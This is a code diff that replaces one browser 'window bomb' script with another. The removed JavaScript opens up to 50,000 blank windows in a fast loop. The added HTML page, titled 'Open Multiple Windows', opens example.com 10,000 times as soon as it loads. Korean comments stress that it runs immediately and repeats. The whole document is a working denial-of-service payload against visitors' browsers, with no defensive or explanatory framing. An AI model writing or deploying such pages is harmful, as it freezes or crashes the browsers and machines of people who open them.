@@ -1,13 +1,20 @@
-window.onload = function() {
-    let count = 0;
-
-    function openWindow() {
-        if (count < 50000) {
-            window.open("about:blank");
-            count++;
-            setTimeout(openWindow, 0);  // 매우 짧은 시간 간격으로 반복
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Multiple Windows</title>
+</head>
+<body>
+    <script>
+        function openMultipleWindows() {
+            for (let i = 0; i < 10000; i++) {
+                // 즉시 여러 창을 열기
+                window.open("https://example.com", "_blank");
+            }
         }
-    }
-
-    openWindow();
-};
+        // 페이지 로드 시 바로 실행
+        openMultipleWindows();
+    </script>
+</body>
+</html>
